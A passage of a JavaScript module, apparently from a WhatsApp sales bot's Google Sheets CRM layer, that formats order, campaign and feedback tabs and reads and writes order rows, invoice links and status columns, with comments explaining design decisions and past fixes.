  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === TARGETED_CLIENTS_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${TARGETED_CLIENTS_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const hasExistingBanding = Boolean(sheetMeta.bandedRanges && sheetMeta.bandedRanges.length > 0);
  const columnCount = TARGETED_CLIENTS_HEADERS.length;
  const statusColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Campaign Status');
  const statusRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: statusColIndex, endColumnIndex: statusColIndex + 1 };
  const phoneColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Phone Number');
  const touchesColIndex = TARGETED_CLIENTS_HEADERS.indexOf('Campaign Touches');
  const timestampStartIndex = TARGETED_CLIENTS_HEADERS.indexOf('Last Message Date');
  // Timestamp formatting must stop after "Offer Sent" — the two new
  // TRUE/FALSE flag columns after it (2026-08-03) are not timestamps and
  // must not get DATE_TIME number formatting applied.
  const timestampEndIndex = TARGETED_CLIENTS_HEADERS.indexOf('Offer Sent') + 1;

  const requests = [
    ...dataTableStyleRequests(sheetId, columnCount, hasExistingBanding),
    {
      setDataValidation: {
        range: statusRange,
        rule: {
          condition: { type: 'ONE_OF_LIST', values: CAMPAIGN_STATUS_COLORS.map(([v]) => ({ userEnteredValue: v })) },
          showCustomUi: true,
          strict: true,
        },
      },
    },
    ...CAMPAIGN_STATUS_COLORS.map(([value, color], index) => ({
      addConditionalFormatRule: {
        rule: {
          ranges: [statusRange],
          booleanRule: {
            condition: { type: 'TEXT_EQ', values: [{ userEnteredValue: value }] },
            format: { backgroundColor: color, textFormat: { foregroundColor: { red: 1, green: 1, blue: 1 }, bold: true } },
          },
        },
        index,
      },
    })),
    // Phone as plain text (never mangled by Sheets' own number formatting), centered.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: phoneColIndex, endColumnIndex: phoneColIndex + 1 },
        cell: { userEnteredFormat: { numberFormat: { type: 'TEXT' }, horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment)',
      },
    },
    // Campaign Touches — numeric, centered.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: touchesColIndex, endColumnIndex: touchesColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(horizontalAlignment)',
      },
    },
    // Last Message Date / Sent At / Replied At / Ordered At — centered; a
    // DATE_TIME numberFormat has no visible effect on the ISO-string text
    // currently stored there, but takes effect automatically if these ever
    // get written as real date values instead.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: timestampStartIndex, endColumnIndex: timestampEndIndex },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', numberFormat: { type: 'DATE_TIME', pattern: 'yyyy-mm-dd hh:mm' } } },
        fields: 'userEnteredFormat(horizontalAlignment,numberFormat)',
      },
    },
    // Bot Paused / Send Now — centered, plain TRUE/FALSE text (same
    // convention as Opt-Out, no special number format needed).
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: timestampEndIndex, endColumnIndex: columnCount },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(horizontalAlignment)',
      },
    },
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${TARGETED_CLIENTS_SHEET_NAME}" (status dropdown + color coding, dark header, banding, auto-fit columns).`);
}

async function formatConfirmedOrdersTab() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === CONFIRMED_ORDERS_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${CONFIRMED_ORDERS_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const hasExistingBanding = Boolean(sheetMeta.bandedRanges && sheetMeta.bandedRanges.length > 0);
  const columnCount = CONFIRMED_ORDERS_HEADERS.length;
  const dateColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Date');
  const phoneColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Phone');
  const priceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Total Price');
  const invoiceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Invoice Link');
  const printColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Print Invoice');
  const sendInvoiceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Send Invoice Action');
  const confirmationColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Confirmation Status');
  const orderStatusColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Order Status');
  const shippingMethodColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Shipping Method');
  const quantityColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Quantity');

  // Same setDataValidation/ONE_OF_LIST + TEXT_EQ conditional-color pattern
  // already used for Offers_Campaign's CAMPAIGN_STATUS/TEST_TRIGGER and
  // Targeted_Clients' Campaign Status (see formatOffersCampaignTable above).
  const dropdown = (range, values) => ({
    setDataValidation: {
      range,
      rule: { condition: { type: 'ONE_OF_LIST', values: values.map((v) => ({ userEnteredValue: v })) }, showCustomUi: true, strict: true },
    },
  });
  const colorRule = (range, textValue, bg, index) => ({
    addConditionalFormatRule: {
      rule: {
        ranges: [range],
        booleanRule: {
          condition: { type: 'TEXT_EQ', values: [{ userEnteredValue: textValue }] },
          format: { backgroundColor: bg, textFormat: { foregroundColor: { red: 1, green: 1, blue: 1 }, bold: true } },
        },
      },
      index,
    },
  });
  const sendInvoiceRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: sendInvoiceColIndex, endColumnIndex: sendInvoiceColIndex + 1 };
  const confirmationRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: confirmationColIndex, endColumnIndex: confirmationColIndex + 1 };
  const orderStatusRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: orderStatusColIndex, endColumnIndex: orderStatusColIndex + 1 };
  const shippingMethodRange = { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: shippingMethodColIndex, endColumnIndex: shippingMethodColIndex + 1 };
  const amber = { red: 0.95, green: 0.61, blue: 0.07 };
  const green = { red: 0.2, green: 0.66, blue: 0.33 };
  const gray = { red: 0.55, green: 0.55, blue: 0.55 };
  const blue = { red: 0.26, green: 0.52, blue: 0.96 };
  const cyan = { red: 0.05, green: 0.6, blue: 0.6 };
  const red = { red: 0.83, green: 0.18, blue: 0.18 };
  const purple = { red: 0.48, green: 0.25, blue: 0.75 };

  const requests = [
    ...dataTableStyleRequests(sheetId, columnCount, hasExistingBanding),
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: dateColIndex, endColumnIndex: dateColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', numberFormat: { type: 'DATE_TIME', pattern: 'yyyy-mm-dd hh:mm' } } },
        fields: 'userEnteredFormat(horizontalAlignment,numberFormat)',
      },
    },
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: phoneColIndex, endColumnIndex: phoneColIndex + 1 },
        cell: { userEnteredFormat: { numberFormat: { type: 'TEXT' }, horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment)',
      },
    },
    // Total Price — real numbers (appendConfirmedOrder writes them via
    // USER_ENTERED, which parses a plain numeric string into an actual
    // number), so a currency pattern renders correctly, not just cosmetically.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: priceColIndex, endColumnIndex: priceColIndex + 1 },
        cell: {
          userEnteredFormat: {
            numberFormat: { type: 'CURRENCY', pattern: '#,##0" ج.م"' },
            horizontalAlignment: 'RIGHT',
            textFormat: { bold: true },
          },
        },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment,textFormat)',
      },
    },
    // Quantity — a plain integer count (appendConfirmedOrder writes it via
    // RAW, which still parses a numeric value into a real number), centered
    // like Phone rather than currency-formatted like Total Price.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: quantityColIndex, endColumnIndex: quantityColIndex + 1 },
        cell: { userEnteredFormat: { numberFormat: { type: 'NUMBER', pattern: '0' }, horizontalAlignment: 'CENTER' } },
        fields: 'userEnteredFormat(numberFormat,horizontalAlignment)',
      },
    },
    // Invoice Link / Print Invoice — HYPERLINK-formula cells (see
    // attachInvoiceLinks), styled to read as clickable actions rather than
    // plain data.
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: invoiceColIndex, endColumnIndex: printColIndex + 1 },
        cell: {
          userEnteredFormat: {
            horizontalAlignment: 'CENTER',
            textFormat: { bold: true, foregroundColor: { red: 0.06, green: 0.36, blue: 0.66 } },
          },
        },
        fields: 'userEnteredFormat(horizontalAlignment,textFormat)',
      },
    },
    dropdown(sendInvoiceRange, ['Send Invoice', 'Sent', 'Resend']),
    dropdown(confirmationRange, ['Hold', 'Pending', 'Confirmed', 'Rejected']),
    // 'Rejected' added 2026-08-11 (store owner directive) — orderPipeline.js
    // now auto-syncs Order Status to 'Rejected' the moment Confirmation
    // Status becomes 'Rejected' (chat rejection or a direct staff Sheet
    // edit), so this needs to be a real selectable/colorable state here too,
    // not just written as a plain string outside the dropdown's known list.
    dropdown(orderStatusRange, ['Processing', 'In Transit', 'Delivered', 'Rejected']),
    // 2026-08-19 — staff can also manually set/correct this via the dropdown
    // (e.g. a phone order taken outside the chat flow); appendConfirmedOrder
    // writes 'Standard'/'Express' automatically for chat-confirmed orders.
    dropdown(shippingMethodRange, ['Standard', 'Express']),
    colorRule(sendInvoiceRange, 'Send Invoice', amber, 0),
    colorRule(sendInvoiceRange, 'Resend', amber, 1),
    colorRule(sendInvoiceRange, 'Sent', green, 2),
    colorRule(confirmationRange, 'Hold', amber, 3),
    colorRule(confirmationRange, 'Pending', blue, 4),
    colorRule(confirmationRange, 'Confirmed', green, 5),
    colorRule(confirmationRange, 'Rejected', red, 6),
    colorRule(orderStatusRange, 'Processing', gray, 7),
    colorRule(orderStatusRange, 'In Transit', blue, 8),
    colorRule(orderStatusRange, 'Delivered', cyan, 9),
    colorRule(orderStatusRange, 'Rejected', red, 10),
    colorRule(shippingMethodRange, 'Express', purple, 11),
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${CONFIRMED_ORDERS_SHEET_NAME}" (dark header, banding, auto-fit columns, currency formatting, order-pipeline dropdowns + color coding).`);
}

// Returns { rowNumber } (or null if disabled) so a caller can later attach
// invoice links to this exact row via attachInvoiceLinks — Invoice Link/
// Print Invoice (columns G:H) are deliberately not written here, since that
// happens afterward and must never block or risk this row itself (see
// invoiceService.js).
//
// shippingMethod (2026-08-19, optional): 'express' | 'standard' | undefined.
// Written as a separate, best-effort update right after the core append
// succeeds (same "don't let a secondary write risk the row that matters"
// reasoning as Invoice Link/Print Invoice above) rather than folded into the
// A:F append itself, so a failure here can never affect the order row being
// created at all — it would just leave the Shipping Method cell blank
// (read as 'Standard' everywhere it's consumed, the safe default) rather
// than losing or corrupting the order.
async function appendConfirmedOrder({ customerName, phone, address, products, totalPrice, shippingMethod, quantity }) {
  if (!enabled) return null;

  // Explicit idempotency check — see ORDER_DEDUP_WINDOW_MS above. No
  // in-memory cache exists for this tab (append-only, low volume, no other
  // reader needs one), so this reads the current rows directly; cheap given
  // how rarely a real order actually confirms.
  if (phone) {
    const existing = await sheetsCall(() =>
      sheetsClient.spreadsheets.values.get(
        { spreadsheetId: config.googleSheetId, range: `${CONFIRMED_ORDERS_SHEET_NAME}!A:F` },
        { timeout: REQUEST_TIMEOUT_MS }
      )
    );
    const nowTs = Date.now();
    const rows = (existing.data.values || []).slice(1);
    const duplicate = rows.find((row) => {
      const [rowDate, , rowPhone, , rowProducts, rowTotal] = row;
      if (rowPhone !== phone) return false;
      if ((rowProducts || '') !== (products || '')) return false;
      if (String(rowTotal || '') !== String(totalPrice != null ? totalPrice : '')) return false;
      const ts = new Date(rowDate).getTime();
      return !Number.isNaN(ts) && Math.abs(nowTs - ts) < ORDER_DEDUP_WINDOW_MS;
    });
    if (duplicate) {
      logger.warn(`Skipped duplicate Confirmed_Orders log for ${phone} (${products || 'unknown'}) — an identical order was already logged at ${duplicate[0]}.`);
      return null;
    }
  }

  const row = sanitizeRowForSheet([
    new Date().toISOString(),
    customerName || '',
    phone || '',
    address || '',
    products || '',
    totalPrice != null ? String(totalPrice) : '',
  ]);
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!A:F`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: [row] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const rowNumber = extractRowNumber(result.data.updates && result.data.updates.updatedRange);

  if (rowNumber) {
    // Shipping Method and Quantity (2026-08-19) are adjacent columns
    // (M:N) — written in one follow-up call rather than two separate ones.
    // Same "never let a secondary write risk the core order row" reasoning
    // as Invoice Link/Print Invoice above: a failure here is logged but the
    // order itself (already appended to A:F) is completely unaffected —
    // the cells just read blank, which every downstream reader already
    // treats as the safe default (Standard / 1 unit).
    const shippingMethodColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Shipping Method');
    const quantityColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Quantity');
    const startCol = columnLetter(shippingMethodColIndex + 1);
    const endCol = columnLetter(quantityColIndex + 1);
    const quantityValue = Number.isInteger(quantity) && quantity > 0 ? quantity : 1;
    try {
      await sheetsCall(() =>
        sheetsClient.spreadsheets.values.update(
          {
            spreadsheetId: config.googleSheetId,
            range: `${CONFIRMED_ORDERS_SHEET_NAME}!${startCol}${rowNumber}:${endCol}${rowNumber}`,
            valueInputOption: 'RAW',
            requestBody: { values: [[shippingMethod === 'express' ? 'Express' : 'Standard', quantityValue]] },
          },
          { timeout: REQUEST_TIMEOUT_MS }
        )
      );
    } catch (err) {
      logger.error(
        `Failed to write Shipping Method/Quantity for Confirmed_Orders row ${rowNumber} — the order itself was still logged normally, but those cells may read blank (treated as Standard/1 unit everywhere they're consumed).`,
        err
      );
    }
  }

  return { rowNumber };
}

// Writes clickable HYPERLINK formulas into an already-existing Confirmed_Orders
// row's Invoice Link/Print Invoice columns. Both point at the same local
// GET /invoice/:rowNumber URL (src/index.js) — the invoice is rendered
// on-the-fly and printed straight from the browser (Ctrl+P), so there's
// nothing else to link to (no Drive/PDF file, no separate "print" variant).
// Returns true only when a write actually happened — callers that need to
// know whether the link is real before, say, texting it to a customer
// (orderPipeline.js/invoiceService.js) must not infer success just because
// this didn't throw, since !enabled/!rowNumber all silently no-op.
//
// 2026-08-10 fix (real customer report — a "عرض الفاتورة" click opened the
// wrong customer's invoice, or 404'd): the row number used to be baked into
// the URL as a plain number at write time. Any later insertion/deletion of
// an EARLIER row (e.g. removing a stray duplicate — see the 2026-08-09
// Confirmed_Orders history) shifts every row below it, but a HYPERLINK's URL
// text never updates itself — it just silently starts pointing at whatever
// row now happens to sit at that old number. Root-caused live: 3 real rows
// (Hala/Sara/Souad) still carried stale numbers from an earlier shift,
// pointing one row too high; Souad's had drifted to a row that no longer
// existed at all (404). Fixed by using Sheets' own ROW() function inside the
// formula instead of a hardcoded number, so the URL recomputes itself from
// wherever this specific row physically is, every time it's opened —
// immune to any future row insertion/deletion elsewhere in the tab.
async function attachInvoiceLinks(rowNumber) {
  if (!enabled || !rowNumber || !config.publicBaseUrl) return false;
  const invoiceColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Invoice Link');
  const printColIndex = CONFIRMED_ORDERS_HEADERS.indexOf('Print Invoice');
  const startCol = columnLetter(invoiceColIndex + 1);
  const endCol = columnLetter(printColIndex + 1);
  // Sheets formula string concatenation (&) with ROW() — evaluated fresh by
  // Sheets on every open, not computed once in JS and frozen into text.
  const dynamicUrlExpr = `"${config.publicBaseUrl}/invoice/"&ROW()&"?token=${config.invoiceViewToken}"`;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!${startCol}${rowNumber}:${endCol}${rowNumber}`,
        valueInputOption: 'USER_ENTERED',
        requestBody: { values: [[`=HYPERLINK(${dynamicUrlExpr},"🧾 عرض الفاتورة")`, `=HYPERLINK(${dynamicUrlExpr},"🖨️ طباعة")`]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  return true;
}

// Writes the order-pipeline columns' (I:K) defaults onto a brand-new
// Confirmed_Orders row — see orderPipeline.js. Called once, right after
// appendConfirmedOrder succeeds, from campaignWorker.js's handleOrderConfirmed.
// Deliberately never called for a pre-existing row: the 2026-08-09 rollout
// only applies to orders created from this point forward, so historical rows
// keep their blank I:K cells rather than being retroactively reset to
// Hold/Processing (which would trigger real "please confirm" messages to
// customers who already received their order).
async function initializeOrderPipelineColumns(rowNumber) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!I${rowNumber}:K${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [['', 'Hold', 'Processing']] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Live, uncached read of every Confirmed_Orders row's pipeline-relevant
// fields — polled by orderPipeline.js on its own timers. No cache (mirrors
// getOffersCampaignRows()'s reasoning): the whole point is staff/customer
// actions on the live Sheet/WhatsApp are picked up promptly.
async function getConfirmedOrdersPipelineRows() {
  if (!enabled) return [];
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get(
      {
        spreadsheetId: config.googleSheetId,
        // 2026-08-19: widened from A2:K to A2:N — A2:M picked up Shipping Fee
        // Override (L, pre-existing — was never read here before, only by
        // getConfirmedOrderByRow for the invoice page) and Shipping Method
        // (M, orderPipeline.js's Trusted_Clients loyalty fee calc needs it to
        // charge the real express fee); N adds Quantity for the same
        // loyalty-total accuracy reasoning.
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!A2:N`,
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const rows = result.data.values || [];
  return rows
    .map((row, i) => {
      const [
        date,
        customerName,
        phone,
        address,
        products,
        totalPrice,
        invoiceLink,
        ,
        sendInvoiceAction,
        confirmationStatus,
        orderStatus,
        shippingFeeOverride,
        shippingMethod,
        quantity,
      ] = row;
      const parsedQuantity = parseInt(quantity, 10);
      return {
        rowNumber: i + 2,
        date,
        customerName,
        phone,
        address,
        products,
        totalPrice,
        invoiceLink: invoiceLink || '',
        sendInvoiceAction: (sendInvoiceAction || '').trim(),
        confirmationStatus: (confirmationStatus || '').trim(),
        orderStatus: (orderStatus || '').trim(),
        shippingFeeOverride: (shippingFeeOverride || '').trim(),
        // Blank (pre-existing rows created before this column existed, or a
        // write that failed and got logged) reads as 'Standard' — the same
        // safe default used everywhere else this value is consumed.
        shippingMethod: (shippingMethod || '').trim().toLowerCase() === 'express' ? 'express' : 'standard',
        // Blank/unparseable reads as 1 — the same safe default used
        // everywhere else this value is consumed, never 0 or NaN.
        quantity: Number.isInteger(parsedQuantity) && parsedQuantity > 0 ? parsedQuantity : 1,
      };
    })
    .filter((row) => row.phone);
}

// Writes Send Invoice Action (column I) to 'Sent' — called by
// orderPipeline.js only after a confirmed successful send, so a transient
// failure leaves 'Send Invoice'/'Resend' visible and gets retried on the
// next poll (same TEST_TRIGGER/clearOfferTestTrigger convention this replaced
// used before it grew a real 'Sent' status). 2026-08-10: also writes
// Confirmation Status (column J) to 'Pending' in the same call — UNLESS
// currentConfirmationStatus is already 'Confirmed' or 'Rejected' (a
// resolved order must not be dragged back to "awaiting reply" just because
// staff resent the invoice) — both columns in one request so a successful
// invoice send can never leave one column updated and the other stale from
// a partial write.
async function markInvoiceSent(rowNumber, currentConfirmationStatus) {
  if (!enabled || !rowNumber) return;
  const resolved = ['Confirmed', 'Rejected'].includes((currentConfirmationStatus || '').trim());
  const range = resolved
    ? `${CONFIRMED_ORDERS_SHEET_NAME}!I${rowNumber}`
    : `${CONFIRMED_ORDERS_SHEET_NAME}!I${rowNumber}:J${rowNumber}`;
  const values = resolved ? [['Sent']] : [['Sent', 'Pending']];
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range,
        valueInputOption: 'RAW',
        requestBody: { values },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Writes Confirmation Status (column J) — called by
// orderConfirmationReplyDetector.js's handler in llmAgent.js once a customer
// replies تأكيد/تمام/confirm to the automated confirmation-request message.
async function setConfirmationStatus(rowNumber, status) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!J${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [[status]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Writes Order Status (column K) — previously staff-only (Processing/In
// Transit/Delivered, set manually in the Sheet), now also written
// automatically by orderPipeline.js's runRejectedStatusSyncCheck the moment
// Confirmation Status reads 'Rejected', so a rejected order's fulfillment
// status can't be left showing 'Processing' as if it were still headed out.
async function setOrderStatus(rowNumber, status) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!K${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [[status]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Writes column L ('Shipping Fee Override') — a staff/admin exception rate
// (e.g. a one-off free-shipping goodwill gesture) that overrides
// shippingZones.matchShippingZone(address)'s computed fee for this specific
// order only. feeEGP of 0 is a real, valid override (free shipping) and must
// be written as such — never confused with "no override" (a blank cell,
// see getConfirmedOrderByRow).
async function setShippingFeeOverride(rowNumber, feeEGP) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!L${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [[feeEGP]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Writes column F ('Total Price') — this column has only ever stored the
// PRODUCTS total (see invoiceGenerator.js's productTotal param); the
// shipping fee is always computed separately at invoice-render time
// (shippingZones.matchShippingZone, or the 'Shipping Fee Override'
// exception above) and added on top, never baked into this cell. Exists so
// a staff/admin correction to the products total can be made explicitly
// rather than only ever written once at order-creation time.
async function setTotalPrice(rowNumber, totalPrice) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!F${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [[totalPrice]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Writes Products (E) + Total Price (F) together in one call — used by
// campaignWorker.js's handleOrderConfirmed when a customer adds/changes an
// item while their order is still an open draft (Confirmation Status Hold
// or Pending, not yet Confirmed), so the SAME row gets the merged item list
// and recalculated total instead of a second row being appended. One write
// covers both cells atomically so a mid-write failure can never leave
// Products and Total Price disagreeing about what's actually in the order.
async function updateConfirmedOrderItems(rowNumber, { products, totalPrice }) {
  if (!enabled || !rowNumber) return;
  await sheetsCall(() =>
    sheetsClient.spreadsheets.values.update(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!E${rowNumber}:F${rowNumber}`,
        valueInputOption: 'RAW',
        requestBody: { values: [[products, totalPrice]] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
}

// Appends one delivery-feedback row — mirrors appendConfirmedOrder's shape
// (sanitizeRowForSheet + values.append). Called by feedbackRatingDetector.js's
// handler in llmAgent.js once a recognizable 1-5 rating is found in the
// customer's reply to orderPipeline.js's delivery+rating-request message.
async function appendFeedback({ customerName, phone, rating, comments }) {
  if (!enabled) return null;
  const row = sanitizeRowForSheet([
    new Date().toISOString(),
    customerName || '',
    phone || '',
    rating != null ? String(rating) : '',
    comments || '',
  ]);
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${FEEDBACK_SHEET_NAME}!A:E`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: [row] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const rowNumber = extractRowNumber(result.data.updates && result.data.updates.updatedRange);
  logger.success(`Feedback logged for ${phone} (rating ${rating}, row ${rowNumber}).`);
  return { rowNumber };
}

// Appends one unlisted-product-request row — same shape/pattern as
// appendFeedback above. Called by llmAgent.js's handleMessage once the
// customer's next reply after Sara's "not available, tell me the name/specs"
// line has been captured (see awaitingUnlistedProductDetails).
async function appendUnlistedProductRequest({ phone, customerName, productDetails, imageUrl }) {
  if (!enabled) return null;
  const row = sanitizeRowForSheet([
    new Date().toISOString(),
    phone || '',
    customerName || '',
    productDetails || '',
    imageUrl || '',
  ]);
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.append(
      {
        spreadsheetId: config.googleSheetId,
        range: `${UNLISTED_PRODUCT_REQUESTS_SHEET_NAME}!A:E`,
        valueInputOption: 'USER_ENTERED',
        insertDataOption: 'INSERT_ROWS',
        requestBody: { values: [row] },
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const rowNumber = extractRowNumber(result.data.updates && result.data.updates.updatedRange);
  logger.success(`Unlisted product request logged for ${phone} (row ${rowNumber}).`);
  return { rowNumber };
}

// Pure formatting (same dataTableStyleRequests shared look as the other CRM
// tabs) — safe to re-run anytime, never touches cell content.
async function formatFeedbackTab() {
  if (!enabled) return;
  const meta = await sheetsClient.spreadsheets.get({ spreadsheetId: config.googleSheetId }, { timeout: REQUEST_TIMEOUT_MS });
  const sheetMeta = (meta.data.sheets || []).find((s) => s.properties.title === FEEDBACK_SHEET_NAME);
  if (!sheetMeta) throw new Error(`"${FEEDBACK_SHEET_NAME}" tab not found — run ensureCrmTabs() first.`);
  const sheetId = sheetMeta.properties.sheetId;
  const hasExistingBanding = Boolean(sheetMeta.bandedRanges && sheetMeta.bandedRanges.length > 0);
  const dateColIndex = FEEDBACK_HEADERS.indexOf('Date');
  const ratingColIndex = FEEDBACK_HEADERS.indexOf('Rating');

  const requests = [
    ...dataTableStyleRequests(sheetId, FEEDBACK_HEADERS.length, hasExistingBanding),
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: dateColIndex, endColumnIndex: dateColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', numberFormat: { type: 'DATE_TIME', pattern: 'yyyy-mm-dd hh:mm' } } },
        fields: 'userEnteredFormat(horizontalAlignment,numberFormat)',
      },
    },
    {
      repeatCell: {
        range: { sheetId, startRowIndex: 1, endRowIndex: DATA_TABLE_MAX_ROWS, startColumnIndex: ratingColIndex, endColumnIndex: ratingColIndex + 1 },
        cell: { userEnteredFormat: { horizontalAlignment: 'CENTER', textFormat: { bold: true } } },
        fields: 'userEnteredFormat(horizontalAlignment,textFormat)',
      },
    },
  ];

  await sheetsClient.spreadsheets.batchUpdate(
    { spreadsheetId: config.googleSheetId, requestBody: { requests } },
    { timeout: REQUEST_TIMEOUT_MS }
  );
  logger.success(`Formatted "${FEEDBACK_SHEET_NAME}" (dark header, banding, auto-fit columns).`);
}

// Reads a single Confirmed_Orders row on demand — backs GET /invoice/:rowNumber
// (src/index.js), which renders the invoice fresh on every request rather
// than caching or storing it anywhere.
async function getConfirmedOrderByRow(rowNumber) {
  if (!enabled || !rowNumber) return null;
  const result = await sheetsCall(() =>
    sheetsClient.spreadsheets.values.get(
      {
        spreadsheetId: config.googleSheetId,
        range: `${CONFIRMED_ORDERS_SHEET_NAME}!A${rowNumber}:N${rowNumber}`,
      },
      { timeout: REQUEST_TIMEOUT_MS }
    )
  );
  const row = (result.data.values && result.data.values[0]) || [];
  const [date, customerName, phone, address, products, totalPrice] = row;
  if (!date) return null;
